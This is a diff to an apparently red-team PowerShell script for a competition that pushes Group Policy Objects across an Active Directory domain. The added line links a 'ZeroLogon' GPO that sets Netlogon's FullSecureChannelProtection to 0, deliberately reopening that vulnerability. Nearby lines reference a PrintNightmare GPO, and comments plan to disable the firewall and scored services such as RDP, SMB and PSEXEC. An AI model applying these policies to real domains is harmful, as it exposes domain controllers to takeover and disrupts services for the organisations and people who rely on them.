@@ -90,7 +90,9 @@ New-GPLink -name "PrintNightmare2" -Target $target -LinkEnabled Yes
 #ZeroLogon
 New-GPO -name "ZeroLogon" -domain $domainName
 Set-GPRegistryValue -name "ZeroLogon" -key "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters" -ValueName "FullSecureChannelProtection" -Type DWORD -Value 0
+New-GPLink -name "ZeroLogon" -Target $target -LinkEnabled Yes
 
+#Disable Right Click
 
 # Disable Scored Services if Team is losing (RDP, SMB, PSEXEC, etc)
 #Disable Firewall Service (Requires Reboot)
